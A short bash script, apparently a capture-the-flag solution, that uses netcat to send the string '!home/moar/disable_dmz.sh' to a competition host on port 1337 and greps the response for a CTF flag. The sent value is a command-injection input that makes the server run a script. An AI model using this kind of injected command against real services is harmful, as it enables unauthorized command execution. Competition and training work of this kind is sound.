#!/bin/bash
echo '!home/moar/disable_dmz.sh' | nc -q1 moar.ctfcompetition.com 1337 - | grep -Eo "CTF{.*}"
